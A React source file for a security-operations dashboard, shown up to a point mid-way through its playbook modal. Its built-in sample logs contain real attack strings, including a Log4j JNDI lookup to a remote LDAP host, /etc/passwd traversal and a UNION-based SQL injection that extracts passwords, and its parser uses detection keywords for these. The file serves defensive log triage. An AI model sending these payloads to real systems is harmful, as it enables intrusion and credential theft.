import React, { useState, useEffect, useMemo } from 'react';
import { 
  Globe2, ShieldAlert, AlertTriangle, ShieldCheck, 
  ExternalLink, Search, Crosshair, ChevronRight, Zap, RefreshCw, X, Radio, Layers,
  Activity, Shield, Terminal, Check, Bot, FileCode, Upload, ArrowRight, Play
} from 'lucide-react';
import { Globe3D } from '../globe/Globe3D';
import { GlobalCyberAttack, IdsTrafficEvent } from '../../types';
import { GLOBAL_THREAT_SEEDS, REAL_COUNTRY_THREATS, CountryThreatNode } from '../../data/threatFeed';
import { apiService } from '../../services/api';

interface SocViewProps {
  onAttackFocus?: (coords: [number, number]) => void;
  activeSubSection?: string;
  onOpenAiSwarm?: (initialPrompt?: string) => void;
}

interface ParsedLogEvent {
  id: string;
  timestamp: string;
  sourceIp: string;
  httpMethod: string;
  uri: string;
  statusCode: number;
  attackType: string;
  severity: 'CRITICAL' | 'HIGH' | 'MEDIUM' | 'LOW';
  mitreTechnique: string;
}

const SAMPLE_LOG_PACKS = {
  log4j: `# Apache Web Server Incident Log - Active JNDI & Traversal Probes
198.51.100.42 - - [11/Sep/2026:14:23:10 +0000] "GET /api/v1/search?q=\${jndi:ldap://198.51.100.42:1389/Exploit} HTTP/1.1" 400 324 "-" "Mozilla/5.0"
185.220.101.5 - - [11/Sep/2026:14:23:12 +0000] "POST /login HTTP/1.1" 401 512 "-" "python-requests/2.28.1"
203.0.113.88 - - [11/Sep/2026:14:23:15 +0000] "GET /../../../../etc/passwd HTTP/1.1" 404 182 "-" "sqlmap/1.6"
45.33.32.156 - - [11/Sep/2026:14:23:19 +0000] "GET /phpmyadmin/scripts/setup.php HTTP/1.1" 404 168 "-" "Mozilla/5.0"
91.240.118.242 - - [11/Sep/2026:14:23:22 +0000] "GET /cgi-bin/%%35%63%%35%63/winnt/system32/cmd.exe?/c+dir HTTP/1.1" 400 284`,

  sqli: `# Perimeter Gateway Honeypot - SQLi & Deserialization Surge
194.26.29.112 - - [11/Sep/2026:14:30:01 +0000] "GET /items?id=1' UNION SELECT username,password FROM users-- HTTP/1.1" 200 1842
141.98.11.89 - - [11/Sep/2026:14:30:05 +0000] "GET /.env HTTP/1.1" 404 153
185.191.171.12 - - [11/Sep/2026:14:30:11 +0000] "POST /graphql HTTP/1.1" 500 128 "mutation { systemExec(cmd: 'whoami') }"
104.244.42.1 - - [11/Sep/2026:14:30:18 +0000] "POST /wp-login.php HTTP/1.1" 200 4521 "-" "Go-http-client/1.1"`
};

export const SocView: React.FC<SocViewProps> = ({ 
  activeSubSection = 'globe',
  onOpenAiSwarm,
}) => {
  const [attacks, setAttacks] = useState<GlobalCyberAttack[]>(() => {
    return GLOBAL_THREAT_SEEDS.map((seed, idx) => ({
      ...seed,
      id: `atk-${Date.now()}-${idx}`,
      timestamp: new Date(Date.now() - idx * 45000).toLocaleTimeString(),
    }));
  });

  const [selectedAttack, setSelectedAttack] = useState<GlobalCyberAttack | null>(null);
  const [selectedCountry, setSelectedCountry] = useState<CountryThreatNode | null>(null);
  const [focusCoords, setFocusCoords] = useState<[number, number] | null>(null);
  const [rightDeckTab, setRightDeckTab] = useState<'stream' | 'countries' | 'ids' | 'parser'>('stream');
  const [filterSeverity, setFilterSeverity] = useState<'ALL' | 'CRITICAL' | 'HIGH'>('ALL');
  const [searchQuery, setSearchQuery] = useState('');
  const [triageModalOpen, setTriageModalOpen] = useState(false);

  // Live IDS Sensor State
  const [idsEvents, setIdsEvents] = useState<IdsTrafficEvent[]>([]);
  const [activeAlertBanner, setActiveAlertBanner] = useState<IdsTrafficEvent | null>(null);
  const [blockedIps, setBlockedIps] = useState<Set<string>>(new Set());

  // Log Parser State
  const [rawLogInput, setRawLogInput] = useState(SAMPLE_LOG_PACKS.log4j);
  const [parsedEvents, setParsedEvents] = useState<ParsedLogEvent[]>([]);
  const [isParsingLogs, setIsParsingLogs] = useState(false);

  // Sync with NavRail activeSubSection
  useEffect(() => {
    if (activeSubSection === 'stream') setRightDeckTab('stream');
    else if (activeSubSection === 'countries') setRightDeckTab('countries');
    else if (activeSubSection === 'ids') setRightDeckTab('ids');
  }, [activeSubSection]);

  // Poll IDS Events from /api/ids
  useEffect(() => {
    const fetchIds = async () => {
      try {
        const res = await apiService.getIdsEvents();
        if (res.events && res.events.length > 0) {
          setIdsEvents(res.events);
          const latest = res.events[0];
          if (latest && (latest.severity === 'Critical' || latest.signature.includes('Nmap'))) {
            setActiveAlertBanner(latest);
          }
        }
      } catch (err) {
        console.warn('IDS poll failed:', err);
      }
    };
    fetchIds();
    const interval = setInterval(fetchIds, 6000);
    return () => clearInterval(interval);
  }, []);

  const handleBlockIp = (ip: string) => {
    setBlockedIps((prev) => new Set(prev).add(ip));
    setIdsEvents((prev) => prev.map((e) => (e.sourceIp === ip ? { ...e, status: 'Blocked' as const } : e)));
    setTimeout(() => {
      if (activeAlertBanner?.sourceIp === ip) setActiveAlertBanner(null);
    }, 1500);
  };

  const handleSelectAttack = (atk: GlobalCyberAttack) => {
    setSelectedAttack(atk);
    setSelectedCountry(null);
    setFocusCoords(atk.targetCoords);
  };

  const handleSelectCountry = (ct: CountryThreatNode) => {
    setSelectedCountry(ct);
    setSelectedAttack(null);
    setFocusCoords(ct.centerCoords);
  };

  // Parser Engine: Parses raw logs into structured CTI events
  const handleParseLogs = () => {
    setIsParsingLogs(true);
    const lines = rawLogInput.split('\n').map(l => l.trim()).filter(l => l && !l.startsWith('#'));
    const results: ParsedLogEvent[] = [];

    lines.forEach((line, idx) => {
      // Extract IP address
      const ipMatch = line.match(/^(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})/);
      const ip = ipMatch ? ipMatch[1] : `192.0.2.${idx + 10}`;

      // Extract HTTP method & URI
      const reqMatch = line.match(/"(GET|POST|PUT|DELETE|HEAD|OPTIONS)\s+([^"\s]+)\s+HTTP\/[0-9.]+"/i);
      const method = reqMatch ? reqMatch[1] : 'GET';
      const uri = reqMatch ? reqMatch[2] : '/';

      // Extract Status Code
      const statusMatch = line.match(/"\s+(\d{3})\s+/);
      const status = statusMatch ? parseInt(statusMatch[1], 10) : 200;

      // Classify Attack Pattern
      let attackType = 'Normal Web Request';
      let severity: 'CRITICAL' | 'HIGH' | 'MEDIUM' | 'LOW' = 'LOW';
      let mitre = 'T1071: Standard Application Layer Protocol';

      const lower = line.toLowerCase();
      if (lower.includes('jndi') || lower.includes('ldap://') || lower.includes('cve-2021-44228')) {
        attackType = 'Log4j JNDI Remote Code Execution';
        severity = 'CRITICAL';
        mitre = 'T1190: Exploit Public-Facing Application';
      } else if (lower.includes('..') || lower.includes('/etc/passwd') || lower.includes('system32')) {
        attackType = 'Directory Path Traversal';
        severity = 'HIGH';
        mitre = 'T1083: File and Directory Discovery';
      } else if (lower.includes('union') || lower.includes('select') || lower.includes('--') || lower.includes('sqlmap')) {
        attackType = 'SQL Injection (Blind / Union-Based)';
        severity = 'HIGH';
        mitre = 'T1190: Exploit Public-Facing Application';
      } else if (lower.includes('wp-login') || lower.includes('/login') || lower.includes('401')) {
        attackType = 'Credential Brute-Force';
        severity = 'MEDIUM';
        mitre = 'T1110: Brute Force';
      } else if (lower.includes('.env') || lower.includes('setup.php')) {
        attackType = 'Environment Reconnaissance Probe';
        severity = 'MEDIUM';
        mitre = 'T1595: Active Scanning';
      }

      results.push({
        id: `parsed-${Date.now()}-${idx}`,
        timestamp: new Date().toLocaleTimeString(),
        sourceIp: ip,
        httpMethod: method,
        uri,
        statusCode: status,
        attackType,
        severity,
        mitreTechnique: mitre,
      });
    });

    setParsedEvents(results);
    setIsParsingLogs(false);

    // Also inject high-severity parsed events into the active attacks map
    const newAttacks: GlobalCyberAttack[] = results
      .filter(r => r.severity === 'CRITICAL' || r.severity === 'HIGH')
      .map((r, i) => ({
        id: `ingest-${r.id}`,
        timestamp: r.timestamp,
        sourceCountry: 'External Adversary',
        sourceCity: r.sourceIp,
        sourceFlag: '🏴‍☠️',
        sourceCoords: [20 + i * 5, -10 + i * 15] as [number, number],
        targetCountry: 'Protected Infrastructure',
        targetCity: 'Gateway Perimeter',
        targetFlag: '🛡️',
        targetCoords: [48.8566, 2.3522],
        vector: `${r.attackType} (${r.httpMethod} ${r.uri})`,
        threatActor: `APT-ACTOR-${r.sourceIp.split('.')[0]}`,
        severity: r.severity as 'CRITICAL' | 'HIGH',
        status: 'DETECTED',
      }));

    if (newAttacks.length > 0) {
      setAttacks(prev => [...newAttacks, ...prev.slice(0, 30)]);
    }
  };

  const filteredAttacks = attacks.filter((atk) => {
    const matchesSeverity = filterSeverity === 'ALL' || atk.severity === filterSeverity;
    const matchesSearch =
      searchQuery === '' ||
      atk.threatActor.toLowerCase().includes(searchQuery.toLowerCase()) ||
      atk.vector.toLowerCase().includes(searchQuery.toLowerCase()) ||
      atk.targetCity?.toLowerCase().includes(searchQuery.toLowerCase()) ||
      atk.sourceCity?.toLowerCase().includes(searchQuery.toLowerCase());
    return matchesSeverity && matchesSearch;
  });

  const filteredCountries = REAL_COUNTRY_THREATS.filter((ct) => {
    if (!searchQuery) return true;
    const q = searchQuery.toLowerCase();
    return (
      ct.country.toLowerCase().includes(q) ||
      ct.code.toLowerCase().includes(q) ||
      ct.primaryVector.toLowerCase().includes(q) ||
      ct.topActors.some((a) => a.toLowerCase().includes(q))
    );
  });

  const filteredIdsEvents = idsEvents.filter((e) => {
    if (!searchQuery) return true;
    const q = searchQuery.toLowerCase();
    return (
      e.eventType.toLowerCase().includes(q) ||
      e.signature.toLowerCase().includes(q) ||
      e.sourceIp.toLowerCase().includes(q) ||
      e.targetEndpoint.toLowerCase().includes(q) ||
      e.country.toLowerCase().includes(q)
    );
  });

  return (
    <div className="flex-1 w-full h-full flex flex-col overflow-hidden font-sans text-slate-200">
      {/* 1. Header Status Bar */}
      <div className="px-4 py-2 bg-[#090e18] border-b border-slate-800/80 flex items-center justify-between gap-3 shrink-0">
        <div className="flex items-center gap-5 text-xs">
          <div className="flex items-center gap-2">
            <span className="w-2 h-2 rounded-full bg-emerald-400" />
            <span className="font-mono text-slate-400">TELEMETRY GRID:</span>
            <span className="font-semibold text-white">NOMINAL</span>
          </div>

          <div className="h-4 w-[1px] bg-slate-800" />

          <div className="flex items-center gap-1.5 font-mono text-slate-400">
            <span>ACTIVE INCIDENTS:</span>
            <span className="font-bold text-white">{attacks.length}</span>
          </div>

          <div className="h-4 w-[1px] bg-slate-800 hidden sm:block" />

          <div className="flex items-center gap-1.5 font-mono text-slate-400 hidden sm:flex">
            <span>IDS SENSORS:</span>
            <span className="font-bold text-emerald-400">ONLINE ({idsEvents.length})</span>
          </div>

          {blockedIps.size > 0 && (
            <div className="flex items-center gap-1.5 font-mono text-red-400">
              <span>FIREWALL DROPS:</span>
              <span className="font-bold">{blockedIps.size}</span>
            </div>
          )}
        </div>

        {/* Global AI Swarm Triage Trigger */}
        {onOpenAiSwarm && (
          <button
            onClick={() => onOpenAiSwarm('Execute deep triage across active network telemetry anomalies and recommend firewall containment policy.')}
            className="flex items-center gap-1.5 px-2.5 py-1 rounded bg-blue-950/70 border border-blue-800/60 hover:border-blue-700 text-blue-300 text-xs font-medium transition-colors cursor-pointer"
          >
            <Bot className="w-3.5 h-3.5 text-blue-400" />
            <span>AI Triage Swarm</span>
          </button>
        )}
      </div>

      {/* 2. Main Stage Grid: 3D Living Globe (Left) + High-Density Telemetry Deck (Right) */}
      <div className="flex-1 w-full grid grid-cols-1 lg:grid-cols-12 overflow-hidden">
        {/* Left Pane: 3D Globe */}
        <div className="lg:col-span-7 xl:col-span-8 flex flex-col h-full bg-[#070b13] relative border-r border-slate-800/80 overflow-hidden">
          {/* Urgent Intrusion Alert Banner */}
          {activeAlertBanner && (
            <div className="absolute top-3 left-3 right-3 z-30 p-3 rounded-lg bg-red-950/90 border border-red-800/80 shadow-lg backdrop-blur-md flex items-center justify-between gap-3 animate-in fade-in">
              <div className="flex items-center gap-2.5 min-w-0">
                <div className="w-7 h-7 rounded bg-red-600 flex items-center justify-center text-white shrink-0">
                  <ShieldAlert className="w-4 h-4" />
                </div>
                <div className="min-w-0">
                  <div className="flex items-center gap-2 text-xs font-semibold text-red-200">
                    <span>INTRUSION INTERCEPT:</span>
                    <span className="font-mono text-white truncate">{activeAlertBanner.signature}</span>
                  </div>
                  <div className="text-[11px] text-red-300/80 font-mono mt-0.5">
                    Source: <span className="text-white font-bold">{activeAlertBanner.sourceIp}</span> ({activeAlertBanner.country}) ⟶ Port {activeAlertBanner.targetPort}
                  </div>
                </div>
              </div>

              <div className="flex items-center gap-2 shrink-0">
                <button
                  onClick={() => handleBlockIp(activeAlertBanner.sourceIp)}
                  disabled={blockedIps.has(activeAlertBanner.sourceIp)}
                  className="px-2.5 py-1 rounded bg-red-600 hover:bg-red-500 text-white text-xs font-medium flex items-center gap-1 transition-colors cursor-pointer disabled:opacity-50"
                >
                  <Zap className="w-3 h-3" />
                  <span>{blockedIps.has(activeAlertBanner.sourceIp) ? 'Dropped' : 'Block IP (iptables)'}</span>
                </button>
                <button
                  onClick={() => setActiveAlertBanner(null)}
                  className="text-red-400 hover:text-white p-1"
                >
                  <X className="w-3.5 h-3.5" />
                </button>
              </div>
            </div>
          )}

          <Globe3D
            attacks={attacks}
            selectedAttack={selectedAttack}
            onSelectAttack={handleSelectAttack}
            focusCoords={focusCoords}
            onSelectCountry={handleSelectCountry}
          />

          {/* Selected Attack Inspector Pill */}
          {selectedAttack && (
            <div className="absolute bottom-3 left-3 right-3 max-w-lg p-3 rounded-lg bg-[#0a101d]/95 border border-slate-700 shadow-xl backdrop-blur-md z-20 flex items-center justify-between gap-3 text-xs">
              <div>
                <div className="flex items-center gap-2 text-slate-300 font-medium">
                  <span className="text-red-400 font-bold uppercase">{selectedAttack.severity}:</span>
                  <span>{selectedAttack.threatActor}</span>
                  <span className="text-slate-500">⟶</span>
                  <span>{selectedAttack.targetCity}, {selectedAttack.targetCountry}</span>
                </div>
                <div className="text-[11px] text-slate-400 mt-0.5 font-mono truncate max-w-sm">
                  {selectedAttack.vector}
                </div>
              </div>
              <button
                onClick={() => setSelectedAttack(null)}
                className="text-slate-400 hover:text-white p-1"
              >
                <X className="w-4 h-4" />
              </button>
            </div>
          )}
        </div>

        {/* Right Pane: Telemetry Tabs & Log Ingestion Engine */}
        <div className="lg:col-span-5 xl:col-span-4 flex flex-col h-full bg-[#0b101b] overflow-hidden">
          {/* Deck Header Tabs */}
          <div className="p-2 border-b border-slate-800 bg-[#090e18] flex items-center justify-between text-xs">
            <div className="flex items-center gap-1">
              <button
                onClick={() => setRightDeckTab('stream')}
                className={`px-2.5 py-1 rounded font-medium transition-colors cursor-pointer ${
                  rightDeckTab === 'stream'
                    ? 'bg-slate-800 text-white font-semibold'
                    : 'text-slate-400 hover:text-slate-200'
                }`}
              >
                Incidents ({attacks.length})
              </button>

              <button
                onClick={() => setRightDeckTab('ids')}
                className={`px-2.5 py-1 rounded font-medium transition-colors cursor-pointer ${
                  rightDeckTab === 'ids'
                    ? 'bg-slate-800 text-white font-semibold'
                    : 'text-slate-400 hover:text-slate-200'
                }`}
              >
                IDS Alerts ({idsEvents.length})
              </button>

              <button
                onClick={() => setRightDeckTab('countries')}
                className={`px-2.5 py-1 rounded font-medium transition-colors cursor-pointer ${
                  rightDeckTab === 'countries'
                    ? 'bg-slate-800 text-white font-semibold'
                    : 'text-slate-400 hover:text-slate-200'
                }`}
              >
                Countries ({REAL_COUNTRY_THREATS.length})
              </button>

              <button
                onClick={() => setRightDeckTab('parser')}
                className={`px-2.5 py-1 rounded font-medium transition-colors cursor-pointer flex items-center gap-1 ${
                  rightDeckTab === 'parser'
                    ? 'bg-blue-600/20 text-blue-300 border border-blue-500/50'
                    : 'text-slate-400 hover:text-slate-200'
                }`}
              >
                <FileCode className="w-3 h-3 text-blue-400" />
                <span>Log Parser</span>
              </button>
            </div>
          </div>

          {/* Search bar inside deck (hidden in parser mode) */}
          {rightDeckTab !== 'parser' && (
            <div className="p-2 border-b border-slate-800 bg-[#080d17]">
              <div className="relative">
                <Search className="w-3.5 h-3.5 text-slate-500 absolute left-2.5 top-1/2 -translate-y-1/2" />
                <input
                  type="text"
                  value={searchQuery}
                  onChange={(e) => setSearchQuery(e.target.value)}
                  placeholder="Filter by actor, IP, vector, or country..."
                  className="w-full pl-8 pr-3 py-1 text-xs bg-slate-900 border border-slate-800 rounded text-white placeholder-slate-500 focus:outline-none focus:border-blue-500"
                />
              </div>
            </div>
          )}

          {/* Deck Body */}
          <div className="flex-1 overflow-y-auto p-2.5 space-y-2">
            {rightDeckTab === 'stream' && (
              filteredAttacks.length === 0 ? (
                <div className="p-8 text-center text-xs text-slate-500 border border-dashed border-slate-800 rounded">
                  No active incidents matching current filter.
                </div>
              ) : (
                filteredAttacks.map((atk) => {
                  const isSelected = selectedAttack?.id === atk.id;
                  const isCrit = atk.severity === 'CRITICAL';
                  const isHigh = atk.severity === 'HIGH';

                  return (
                    <div
                      key={atk.id}
                      onClick={() => handleSelectAttack(atk)}
                      className={`p-2.5 rounded border transition-all cursor-pointer ${
                        isSelected
                          ? 'bg-blue-600/10 border-blue-500 shadow-sm'
                          : isCrit
                          ? 'bg-red-950/20 border-red-900/40 hover:border-red-700/60'
                          : 'bg-[#090e18] border-slate-800 hover:border-slate-700 hover:bg-slate-900/50'
                      }`}
                    >
                      <div className="flex items-center justify-between mb-1">
                        <div className="flex items-center gap-1.5 min-w-0">
                          <span className="text-sm">{atk.sourceFlag || '🌐'}</span>
                          <span className="font-mono text-xs font-semibold text-white truncate">
                            {atk.threatActor}
                          </span>
                        </div>
                        <div className="flex items-center gap-1.5 shrink-0">
                          <span
                            className={`text-[9px] px-1.5 py-0.5 rounded font-mono font-bold uppercase ${
                              isCrit
                                ? 'bg-red-900/40 text-red-300 border border-red-800/60'
                                : isHigh
                                ? 'bg-amber-900/40 text-amber-300 border border-amber-800/60'
                                : 'bg-slate-800 text-slate-300 border border-slate-700'
                            }`}
                          >
                            {atk.severity}
                          </span>
                          <span className="font-mono text-[10px] text-slate-500">{atk.timestamp}</span>
                        </div>
                      </div>

                      <div className="text-[11px] text-slate-300 truncate font-mono">
                        {atk.vector}
                      </div>

                      <div className="mt-1.5 pt-1.5 border-t border-slate-800/80 flex items-center justify-between text-[10px]">
                        <span className="text-slate-400 flex items-center gap-1">
                          <span className="text-slate-500">Target:</span>
                          <span className="text-slate-200">{atk.targetCity}, {atk.targetCountry}</span>
                        </span>
                        <div className="flex items-center gap-2">
                          <span className="text-emerald-400 font-mono flex items-center gap-1">
                            <ShieldCheck className="w-3 h-3 text-emerald-400" />
                            {atk.status || 'INGRESS_ANALYZED'}
                          </span>
                          <button
                            onClick={(e) => {
                              e.stopPropagation();
                              setSelectedAttack(atk);
                              setTriageModalOpen(true);
                            }}
                            className="px-1.5 py-0.5 rounded bg-slate-800 hover:bg-slate-700 text-slate-300 hover:text-white transition-colors"
                          >
                            Playbook
                          </button>
                        </div>
                      </div>
                    </div>
                  );
                })
              )
            )}

            {rightDeckTab === 'ids' && (
              <div className="space-y-2">
                {/* IDS Mini-Telemetry Bar */}
                <div className="p-2 rounded bg-slate-900/80 border border-slate-800 flex items-center justify-between text-[11px]">
                  <div className="flex items-center gap-2">
                    <span className="w-2 h-2 rounded-full bg-emerald-400" />
                    <span className="text-emerald-400 font-bold font-mono">SURICATA SENSOR ACTIVE</span>
                  </div>
                  <div className="text-slate-400 font-mono text-[10px]">
                    Events: <span className="text-white font-semibold">{idsEvents.length}</span> | Blocked: <span className="text-red-400 font-semibold">{blockedIps.size}</span>
                  </div>
                </div>

                {filteredIdsEvents.length === 0 ? (
                  <div className="p-6 text-center text-xs text-slate-500 border border-dashed border-slate-800 rounded">
                    No active intrusion signatures detected.
                  </div>
                ) : (
                  filteredIdsEvents.map((evt) => {
                    const isBlocked = evt.status === 'Blocked' || blockedIps.has(evt.sourceIp);
                    const isCrit = evt.severity === 'Critical';

                    return (
                      <div
                        key={evt.id}
                        className={`p-2.5 rounded border transition-all ${
                          isCrit
                            ? 'bg-red-950/20 border-red-900/50'
                            : 'bg-[#090e18] border-slate-800'
                        }`}
                      >
                        <div className="flex items-center justify-between mb-1">
                          <div className="flex items-center gap-1.5 font-mono text-xs text-white">
                            <span>{evt.countryFlag}</span>
                            <span className="text-red-400 font-bold">{evt.sourceIp}</span>
                            <span className="text-slate-600">⟶</span>
                            <span className="text-slate-300 truncate max-w-[140px]">{evt.targetEndpoint}</span>
                          </div>
                          <span
                            className={`text-[9px] px-1.5 py-0.5 rounded font-mono font-bold uppercase ${
                              isBlocked
                                ? 'bg-emerald-950 text-emerald-400 border border-emerald-800/60'
                                : 'bg-red-950 text-red-400 border border-red-800/60'
                            }`}
                          >
                            {isBlocked ? 'BLOCKED' : 'DETECTED'}
                          </span>
                        </div>

                        <div className="text-xs font-semibold text-slate-200 mb-0.5">
                          {evt.eventType}
                        </div>

                        <div className="text-[10px] text-slate-400 font-mono mb-1.5">
                          Sig: <span className="text-amber-300">{evt.signature}</span> · {evt.mitreTechnique}
                        </div>

                        <div className="p-1.5 rounded bg-slate-900/60 border border-slate-800 text-[10px] text-slate-300 font-sans mb-2">
                          {evt.mitigationTip}
                        </div>

                        <div className="flex items-center justify-between pt-1 border-t border-slate-800/60">
                          <span className="text-[9px] text-slate-500 font-mono">{evt.timestamp}</span>
                          <div className="flex items-center gap-1.5">
                            {!isBlocked && (
                              <button
                                onClick={() => handleBlockIp(evt.sourceIp)}
                                className="px-2 py-0.5 rounded bg-red-700/80 hover:bg-red-600 text-white font-mono text-[10px] flex items-center gap-1 transition-colors cursor-pointer"
                              >
                                <Zap className="w-2.5 h-2.5" />
                                <span>Drop IP</span>
                              </button>
                            )}
                            {onOpenAiSwarm && (
                              <button
                                onClick={() => onOpenAiSwarm(`Formulate incident response for: ${evt.eventType} (${evt.signature}) from IP ${evt.sourceIp}`)}
                                className="p-1 rounded bg-slate-800 hover:bg-slate-700 text-slate-300 hover:text-white border border-slate-700 cursor-pointer"
                                title="Triage with AI Swarm"
                              >
                                <Bot className="w-3 h-3" />
                              </button>
                            )}
                          </div>
                        </div>
                      </div>
                    );
                  })
                )}
              </div>
            )}

            {rightDeckTab === 'countries' && (
              filteredCountries.map((ct) => {
                const isSelected = selectedCountry?.country === ct.country;
                return (
                  <div
                    key={ct.country}
                    onClick={() => handleSelectCountry(ct)}
                    className={`p-2.5 rounded border transition-all cursor-pointer ${
                      isSelected
                        ? 'bg-amber-950/20 border-amber-500'
                        : 'bg-[#090e18] border-slate-800 hover:border-slate-700 hover:bg-slate-900/50'
                    }`}
                  >
                    <div className="flex items-center justify-between">
                      <div className="flex items-center gap-2">
                        <span className="text-base">{ct.flag}</span>
                        <div>
                          <div className="text-xs font-semibold text-white flex items-center gap-1.5">
                            <span>{ct.country}</span>
                            <span className="text-[9px] px-1 py-0.2 rounded bg-slate-800 text-slate-400 font-mono">
                              {ct.code}
                            </span>
                          </div>
                          <div className="text-[10px] text-slate-400 font-mono">
                            {ct.dots.length} Sensor Nodes Online
                          </div>
                        </div>
                      </div>

                      <div className="text-right">
                        <div className="text-xs font-bold font-mono text-amber-400">
                          {ct.incidentCount.toLocaleString()}
                        </div>
                        <div className="text-[9px] text-slate-500 uppercase font-mono">Telemetry Events</div>
                      </div>
                    </div>

                    <div className="mt-1.5 pt-1.5 border-t border-slate-800/80 flex items-center justify-between text-[10px]">
                      <span className="text-slate-400 truncate max-w-[210px]">
                        Actors: <span className="text-slate-200 font-mono">{ct.topActors.slice(0, 2).join(', ')}</span>
                      </span>
                      <span className="text-slate-400 font-mono flex items-center gap-0.5">
                        <Crosshair className="w-2.5 h-2.5" /> Focus
                      </span>
                    </div>
                  </div>
                );
              })
            )}

            {rightDeckTab === 'parser' && (
              <div className="space-y-3">
                <div className="p-2.5 rounded bg-slate-900/80 border border-slate-800">
                  <div className="flex items-center justify-between mb-2">
                    <span className="text-xs font-bold text-white font-mono flex items-center gap-1.5">
                      <FileCode className="w-3.5 h-3.5 text-blue-400" />
                      <span>RAW LOG INGESTION ENGINE</span>
                    </span>
                    <div className="flex items-center gap-1 text-[10px]">
                      <span className="text-slate-400">Presets:</span>
                      <button
                        onClick={() => setRawLogInput(SAMPLE_LOG_PACKS.log4j)}
                        className="px-1.5 py-0.5 rounded bg-slate-800 hover:bg-slate-700 text-slate-300 font-mono"
                      >
                        Log4j
                      </button>
                      <button
                        onClick={() => setRawLogInput(SAMPLE_LOG_PACKS.sqli)}
                        className="px-1.5 py-0.5 rounded bg-slate-800 hover:bg-slate-700 text-slate-300 font-mono"
                      >
                        SQLi
                      </button>
                    </div>
                  </div>

                  <textarea
                    value={rawLogInput}
                    onChange={(e) => setRawLogInput(e.target.value)}
                    rows={6}
                    placeholder="Paste raw Apache, Nginx, or Syslog lines here..."
                    className="w-full p-2 bg-[#060a12] border border-slate-800 rounded font-mono text-[11px] text-slate-300 placeholder-slate-600 focus:outline-none focus:border-blue-500 resize-y"
                  />

                  <div className="mt-2 flex items-center justify-between">
                    <span className="text-[10px] text-slate-500 font-mono">
                      Parses IPv4, URIs, Status Codes, and ATT&CK patterns
                    </span>
                    <button
                      onClick={handleParseLogs}
                      disabled={isParsingLogs || !rawLogInput.trim()}
                      className="px-3 py-1 rounded bg-blue-600 hover:bg-blue-500 text-white font-medium text-xs flex items-center gap-1.5 transition-colors cursor-pointer disabled:opacity-50"
                    >
                      <Play className="w-3 h-3" />
                      <span>Parse & Ingest</span>
                    </button>
                  </div>
                </div>

                {/* Parsed Events List */}
                {parsedEvents.length > 0 && (
                  <div className="space-y-1.5">
                    <div className="flex items-center justify-between text-[11px] px-1 font-mono">
                      <span className="text-slate-400">Parsed Ingress Events ({parsedEvents.length})</span>
                      <span className="text-emerald-400">Mapped to 3D Globe</span>
                    </div>

                    {parsedEvents.map((evt) => (
                      <div
                        key={evt.id}
                        className={`p-2 rounded border text-xs font-mono ${
                          evt.severity === 'CRITICAL'
                            ? 'bg-red-950/20 border-red-900/50'
                            : evt.severity === 'HIGH'
                            ? 'bg-amber-950/20 border-amber-900/50'
                            : 'bg-slate-900/50 border-slate-800'
                        }`}
                      >
                        <div className="flex items-center justify-between mb-1">
                          <div className="flex items-center gap-1.5 font-bold">
                            <span className="text-red-400">{evt.sourceIp}</span>
                            <span className="text-slate-600">⟶</span>
                            <span className="text-slate-300 text-[11px]">{evt.httpMethod} {evt.statusCode}</span>
                          </div>
                          <span
                            className={`text-[9px] px-1.5 py-0.2 rounded font-bold ${
                              evt.severity === 'CRITICAL'
                                ? 'bg-red-900/50 text-red-300 border border-red-800'
                                : 'bg-amber-900/50 text-amber-300 border border-amber-800'
                            }`}
                          >
                            {evt.severity}
                          </span>
                        </div>

                        <div className="text-[11px] text-white font-sans font-medium">
                          {evt.attackType}
                        </div>

                        <div className="text-[10px] text-slate-400 truncate mt-0.5">
                          URI: {evt.uri}
                        </div>

                        <div className="mt-1 pt-1 border-t border-slate-800/80 flex items-center justify-between text-[10px]">
                          <span className="text-slate-500">{evt.mitreTechnique}</span>
                          <button
                            onClick={() => handleBlockIp(evt.sourceIp)}
                            disabled={blockedIps.has(evt.sourceIp)}
                            className="px-1.5 py-0.5 rounded bg-red-900/40 hover:bg-red-800/60 text-red-300 text-[10px] flex items-center gap-1 transition-colors"
                          >
                            <Zap className="w-2.5 h-2.5" />
                            <span>{blockedIps.has(evt.sourceIp) ? 'Dropped' : 'Drop IP'}</span>
                          </button>
                        </div>
                      </div>
                    ))}
                  </div>
                )}
              </div>
            )}
          </div>
        </div>
      </div>

      {/* Bottom Bar: Telemetry & Status */}
      <div className="w-full p-2.5 rounded-2xl bg-[#080d18]/90 border border-cyan-500/20 flex flex-wrap items-center justify-between gap-3 text-xs">
        <div className="flex items-center gap-3">
          <div className="flex items-center gap-2 text-cyan-400 font-bold">
            <span className="w-2 h-2 rounded-full bg-emerald-400 animate-ping" />
            <span>GLOBAL ATTACK INGRESS:</span>
          </div>
          <span className="text-slate-300">
            Real Country Hotspots: {REAL_COUNTRY_THREATS.length} Regions // Live Ingress Nodes Online // Auto-Orbit Active
          </span>
        </div>

        <div className="flex items-center gap-2">
          <button
            onClick={() => {
              setAttacks(
                GLOBAL_THREAT_SEEDS.map((seed, idx) => ({
                  ...seed,
                  id: `atk-${Date.now()}-${idx}`,
                  timestamp: new Date().toLocaleTimeString(),
                }))
              );
            }}
            className="flex items-center gap-1.5 px-3 py-1.5 rounded-xl bg-slate-800/80 hover:bg-cyan-500/20 border border-slate-700/60 hover:border-cyan-500/40 text-slate-300 hover:text-cyan-300 transition-colors cursor-pointer text-xs"
          >
            <RefreshCw className="w-3.5 h-3.5" />
            <span>Refresh Real-Time Ingress</span>
          </button>
        </div>
      </div>

      {/* Incident Triage Playbook Modal */}
      {triageModalOpen && selectedAttack && (
        <div className="fixed inset-0 z-50 bg-black/80 backdrop-blur-md flex items-center justify-center p-4">
          <div className="w-full max-w-xl p-5 rounded-2xl bg-[#0c1424] border border-cyan-400 shadow-[0_0_40px_rgba(0,240,255,0.3)] font-mono animate-in zoom-in-95">
            <div className="flex items-center justify-between pb-3 border-b border-cyan-500/30">
              <div className="flex items-center gap-2">
                <ShieldAlert className="w-5 h-5 text-red-400" />
                <span className="text-sm font-bold text-white uppercase">
                  Incident Triage & Mitigation Playbook
                </span>
              </div>
              <button
                onClick={() => setTriageModalOpen(false)}
                className="text-slate-400 hover:text-white p-1"
              >
                <X className="w-4 h-4" />
              </button>
            </div>

            <div className="mt-4 space-y-3 text-xs">
              <div className="p-3 rounded-xl bg-slate-900/80 border border-red-500/30">
                <div className="text-red-400 font-bold text-sm">
                  {selectedAttack.threatActor} ⟶ {selectedAttack.targetCity}, {selectedAttack.targetCountry}
                </div>
